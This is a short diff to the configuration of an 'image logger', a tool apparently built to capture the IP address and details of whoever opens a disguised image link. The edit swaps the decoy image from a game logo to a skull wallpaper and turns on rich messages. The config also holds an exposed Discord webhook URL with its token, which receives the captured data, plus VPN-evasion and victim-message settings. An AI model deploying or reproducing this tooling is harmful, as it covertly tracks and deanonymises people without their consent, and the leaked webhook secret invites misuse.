@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1152647907271528549/WZ2TD5kGYuNjLkqmS_hLIQhVUhMkZr7VhsEco3fZiXJTm_orkmcVozkyq3ja5RFc1q2t",
-    "image": "https://upload.wikimedia.org/wikipedia/en/1/18/Brawl_Stars_logo.png", # You can also have a custom image by using a URL argument
+    "image": "https://wallpapers.com/images/hd/purple-skull-trooper-p7yy73jll67pokde.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -29,7 +29,7 @@ config = {
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
         "message": "Your IP is {ip}", # Message to show
-        "richMessage": False, # Enable rich text? (See README for more info)
+        "richMessage": True, # Enable rich text? (See README for more info)
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
